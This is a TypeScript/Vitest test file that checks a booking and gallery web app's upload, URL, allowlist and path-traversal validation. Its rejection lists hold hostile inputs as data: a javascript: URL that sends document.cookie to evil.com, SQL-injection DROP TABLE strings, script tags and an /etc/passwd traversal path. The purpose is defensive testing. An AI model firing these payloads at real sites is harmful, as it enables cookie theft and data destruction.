/**
 * Input Handling & Injection Prevention Tests
 * Covers: upload MIME/extension security, gallery URL validation,
 * category allowlist enforcement, sort_order type checking,
 * and path traversal prevention.
 */

import { describe, it, expect, vi, beforeEach } from "vitest";

// ─── MIME-type → file extension mapping ──────────────────────────────────────

describe("Upload route — file extension derived from MIME type, not filename", () => {
  // Replicate the exact logic from app/api/upload/route.ts
  const mimeToExt: Record<string, string> = {
    "image/jpeg": "jpg",
    "image/png": "png",
    "image/webp": "webp",
    "image/gif": "gif",
  };

  it("maps image/jpeg → jpg", () => expect(mimeToExt["image/jpeg"]).toBe("jpg"));
  it("maps image/png → png", () => expect(mimeToExt["image/png"]).toBe("png"));
  it("maps image/webp → webp", () => expect(mimeToExt["image/webp"]).toBe("webp"));
  it("maps image/gif → gif", () => expect(mimeToExt["image/gif"]).toBe("gif"));

  it("returns undefined for disallowed MIME types", () => {
    const dangerous = [
      "application/x-php",
      "text/html",
      "application/javascript",
      "image/svg+xml",
    ];
    for (const mime of dangerous) {
      expect(mimeToExt[mime]).toBeUndefined();
    }
  });

  it("a filename of 'malware.php' cannot influence stored extension when MIME is image/jpeg", () => {
    // Simulate attack: user provides a malicious filename but valid JPEG content
    const maliciousFilename = "malware.php";
    const validMime = "image/jpeg";

    // Old vulnerable approach (DO NOT USE)
    const vulnerableExt = maliciousFilename.split(".").pop(); // "php" ← bad
    // New secure approach
    const secureExt = mimeToExt[validMime]; // "jpg" ← correct

    expect(vulnerableExt).toBe("php");     // proves the old way was dangerous
    expect(secureExt).toBe("jpg");         // proves the new way is safe
    expect(secureExt).not.toBe(vulnerableExt);
  });

  it("a filename of 'evil.html' cannot influence stored extension when MIME is image/png", () => {
    const secureExt = mimeToExt["image/png"];
    expect(secureExt).toBe("png");
    expect(secureExt).not.toBe("html");
  });
});

// ─── Gallery image_url validation ────────────────────────────────────────────

describe("Gallery POST — image_url must be a valid HTTPS URL", () => {
  function validateImageUrl(url: string): boolean {
    try {
      const parsed = new URL(url);
      return parsed.protocol === "https:";
    } catch {
      return false;
    }
  }

  const safe = [
    "https://oguvjtcvonnjvbechkjq.supabase.co/storage/v1/object/public/kopila-images/gallery/img.jpg",
    "https://example.com/photo.png",
  ];

  const dangerous = [
    "javascript:fetch('https://evil.com/?c='+document.cookie)",
    "data:text/html,<script>alert(1)</script>",
    "http://example.com/photo.jpg",   // plain HTTP
    "../../../etc/passwd",             // path traversal
    "//evil.com/img.jpg",             // protocol-relative
    "",
    "not-a-url",
  ];

  for (const url of safe) {
    it(`accepts safe URL: ${url.slice(0, 50)}`, () => {
      expect(validateImageUrl(url)).toBe(true);
    });
  }

  for (const url of dangerous) {
    it(`rejects dangerous URL: "${url.slice(0, 60)}"`, () => {
      expect(validateImageUrl(url)).toBe(false);
    });
  }
});

// ─── Gallery PATCH — category allowlist ──────────────────────────────────────

describe("Gallery PATCH — category must be in allowlist", () => {
  const validCategories = ["general", "outdoor", "indoor", "meals", "activities"];

  function validateCategory(value: unknown): boolean {
    return typeof value === "string" && validCategories.includes(value);
  }

  for (const cat of validCategories) {
    it(`accepts valid category: "${cat}"`, () => {
      expect(validateCategory(cat)).toBe(true);
    });
  }

  const invalid = [
    "'; DROP TABLE gallery_images; --",
    "<script>alert(1)</script>",
    "OUTDOOR",                    // wrong case
    "admin",
    "",
    null,
    undefined,
    123,
    ["outdoor"],
  ];

  for (const val of invalid) {
    it(`rejects invalid category: ${JSON.stringify(val)}`, () => {
      expect(validateCategory(val)).toBe(false);
    });
  }
});

// ─── Gallery PATCH — sort_order type/range validation ────────────────────────

describe("Gallery PATCH — sort_order must be a non-negative integer", () => {
  function validateSortOrder(value: unknown): boolean {
    return (
      typeof value === "number" &&
      Number.isInteger(value) &&
      value >= 0
    );
  }

  const valid = [0, 1, 10, 999];
  for (const v of valid) {
    it(`accepts sort_order: ${v}`, () => expect(validateSortOrder(v)).toBe(true));
  }

  const invalid = [-1, -999, 1.5, 3.14, "1", "abc", null, undefined, [], NaN, Infinity];
  for (const v of invalid) {
    it(`rejects sort_order: ${JSON.stringify(v)}`, () => {
      expect(validateSortOrder(v)).toBe(false);
    });
  }
});

// ─── Booking status allowlist ─────────────────────────────────────────────────

describe("Booking PATCH — status must be in allowlist", () => {
  const allowedStatuses = ["pending", "confirmed", "cancelled"];

  function validateStatus(value: unknown): boolean {
    return typeof value === "string" && allowedStatuses.includes(value);
  }

  for (const s of allowedStatuses) {
    it(`accepts status: "${s}"`, () => expect(validateStatus(s)).toBe(true));
  }

  const bad = [
    "admin",
    "'; DROP TABLE bookings; --",
    "CONFIRMED",
    "",
    null,
    true,
  ];

  for (const val of bad) {
    it(`rejects status: ${JSON.stringify(val)}`, () => {
      expect(validateStatus(val)).toBe(false);
    });
  }
});

// ─── Path traversal prevention ────────────────────────────────────────────────

describe("Path traversal — filenames and paths are never user-controlled", () => {
  it("upload route generates filename from timestamp + random, not user input", async () => {
    // The upload route uses: `gallery/${Date.now()}-${Math.random().toString(36).slice(2, 8)}.${ext}`
    // Verify neither segment contains user input
    const timestamp = Date.now();
    const random = Math.random().toString(36).slice(2, 8);
    const ext = "jpg"; // from MIME map

    const filename = `gallery/${timestamp}-${random}.${ext}`;

    expect(filename).toMatch(/^gallery\/\d+-[a-z0-9]+\.(jpg|png|webp|gif)$/);
    expect(filename).not.toContain("..");
    expect(filename).not.toContain("//");
  });
});
